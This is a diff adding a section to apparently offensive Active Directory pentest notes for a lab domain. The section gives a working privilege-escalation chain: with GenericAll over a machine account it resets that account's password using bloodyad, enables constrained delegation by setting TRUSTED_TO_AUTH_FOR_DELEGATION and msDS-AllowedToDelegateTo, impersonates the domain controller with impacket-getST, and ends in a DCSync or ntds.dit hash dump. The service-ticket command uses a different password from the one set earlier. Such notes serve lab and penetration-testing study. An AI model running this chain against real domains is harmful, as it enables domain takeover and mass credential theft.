@@ -1433,6 +1433,34 @@ nxc smb dc1.delegate.vl --use-kcache --ntds
 ```
 
 
+If you got a `GenericAll` to existing machine and it fails some steps from previous `SeEnableDelegationPrivilege` exploitation you can perform a `Constrained Delegation` on an existing machine. All steps can be checked by `impacket-findDelegation`
+
+First change password of machine account. `GenericAll` required
+
+```bash
+bloodyad --host dc.redelegate.vl -d redelegate.vl -u HELEN.FROST -p 'Pa33word@!'  set password fs01$ 'Pa33word@!'  
+```
+
+`TRUSTED_TO_AUTH_FOR_DELEGATION` add this attribute to `uac` for `Constrained Delegation` 
+
+```bash
+bloodyad --host dc.redelegate.vl -d redelegate.vl -u HELEN.FROST -p 'Pa33word@!'  add uac 'fs01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION 
+```
+
+Also modify a `msDS-AllowedToDelegateTo` pointing to `cifs/dc.redelegate.vl`. It's doing because after we got a `CIFS` service ticket
+
+```bash
+bloodyad --host dc.redelegate.vl -d redelegate.vl -u HELEN.FROST -p 'Pa33word@!'  set object 'fs01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
+```
+
+Get a `CIFS` service ticket as a `DC` 
+
+```bash
+impacket-getST redelegate.vl/'fs01$':'Password1@!' -spn cifs/dc.redelegate.vl -impersonate dc
+```
+
+Then we perform a `DCSync` attack or dump `ntds.dit` hashes as we have a full access to file system
+
 
 [[cross-session]]
 == Cross-Session
